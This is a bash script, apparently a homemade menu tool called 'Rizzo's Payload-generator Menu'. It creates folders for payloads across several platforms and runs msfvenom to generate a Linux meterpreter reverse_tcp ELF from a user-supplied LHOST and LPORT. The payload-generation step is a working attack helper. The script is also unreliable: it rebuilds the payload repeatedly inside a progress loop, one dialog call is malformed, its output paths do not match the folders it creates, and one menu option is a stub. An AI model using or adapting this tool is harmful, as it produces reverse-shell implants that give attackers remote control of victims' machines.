#! /bin/bash
whiptail --title "Rizzo's Payload-generator Menu" --yesno --defaultno "Hello $(whoami). Start the program?" 8 78

exitstatus=$?
if [ $exitstatus = 0 ]; then
    status="0"
    while [ "$status" -eq 0 ]
    do
        choice=$(whiptail --title "Testing" --menu "Make a choice" 16 78 5 \
        "1." "Check/Create Working Directories." \
        "2." "Create all Payloads." \
        "3." "Start backing up the second application." 3>&2 2>&1 1>&3)

        # Change to lower case and remove spaces.
        option=$(echo $choice | tr '[:upper:]' '[:lower:]' | sed 's/ //g')
        case "${option}" in
            1.)
                if (whiptail --title "Workingdir" --yesno "Create files and folders in current direrrently? $(pwd)" 8 78) then
                filepath=$(pwd)
                {
                    for ((i = 0 ; i <= 100 ; i+=5)); do
                      mkdir -p $filepath/Payloads/Binaries/Linux
                      mkdir -p $filepath/Payloads/Binaries/Windows
                      mkdir -p $filepath/Payloads/Binaries/Android
                      mkdir -p $filepath/Payloads/Binaries/Mac
                      mkdir -p $filepath/Payloads/Web/PHP
                      mkdir -p $filepath/Payloads/Web/ASP
                      mkdir -p $filepath/Payloads/Web/JSP
                      mkdir -p $filepath/Payloads/Web/WAR
                      mkdir -p $filepath/Payloads/Scripting/Python
                      mkdir -p $filepath/Payloads/Scripting/Bash
                      mkdir -p $filepath/Payloads/Scripting/Perl
                                  echo $i
                                  done
                                } | whiptail --gauge "Please wait while we are creating the folders..." 6 50 0

                else
                filepath=$(whiptail --inputbox "Where would you like to create the files and folders?" 8 78 ~/Payloads --title "Files/Folders path" 3>&1 1>&2 2>&3)

                  exitstatus=$?
                  if [ $exitstatus = 0 ]; then
                        echo "User selected Ok and entered " $filepath
                        {
                              for ((i = 0 ; i <= 100 ; i+=5)); do
                                mkdir -p $filepath/Binaries/Linux
                                mkdir -p $filepath/Binaries/Windows
                                mkdir -p $filepath/Binaries/Android
                                mkdir -p $filepath/Binaries/Mac
                                mkdir -p $filepath/Web/PHP
                                mkdir -p $filepath/Web/ASP
                                mkdir -p $filepath/Web/JSP
                                mkdir -p $filepath/Web/WAR
                                mkdir -p $filepath/Scripting/Python
                                mkdir -p $filepath/Scripting/Bash
                                mkdir -p $filepath/Scripting/Perl
                                                echo $i
                                                  done
                                                } | whiptail --gauge "Please wait while we are creating the folders..." 6 50 0
                      else
                        echo "User selected Cancel."
                      fi
                      echo "(Exit status was $exitstatus)"
                echo "User selected No, exit status was $?."
                fi
            ;;
            2.)
                LHOST=$(whiptail --inputbox "What is your LHOST?" 8 78 129.168.0.1 --title "LHOST" 3>&1 1>&2 2>&3)

exitstatus=$?
if [ $exitstatus = 0 ]; then
    echo "User selected Ok and entered " $LHOST
else
    echo "User selected Cancel."
fi
LPORT=$(whiptail --inputbox "What is your LPORT?" 8 78 443 --title "LPORT" 3>&1 1>&2 2>&3)

exitstatus=$?
if [ $exitstatus = 0 ]; then
echo "User selected Ok and entered " $LPORT
else
echo "User selected Cancel."
fi
filename=$(whiptail --inputbox "What is filename?" 8 Payload-$LHOST-$LPORT --title "FILENAME" 3>&1 1>&2 2>&3)

exitstatus=$?
if [ $exitstatus = 0 ]; then
echo "User selected Ok and entered " $filename
else
echo "User selected Cancel."
fi
{
    for ((i = 0 ; i <= 100 ; i+=5)); do
        sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > $filepath/Binaries/Linux/$filename-$LHOST-$LPORT.elf
        echo $i
    done
} | whiptail --gauge "Please wait while we are creating payloads..." 6 50 0


            ;;
            3.)
                whiptail --title "Testing" --msgbox "In third option" 8 78
            ;;
            *) whiptail --title "Testing" --msgbox "You cancelled or have finished." 8 78
                status=1
                exit
            ;;
        esac
        exitstatus1=$status1
    done
else
    whiptail --title "Testing" --msgbox "You chose not to start." 8 78
    exit
fi
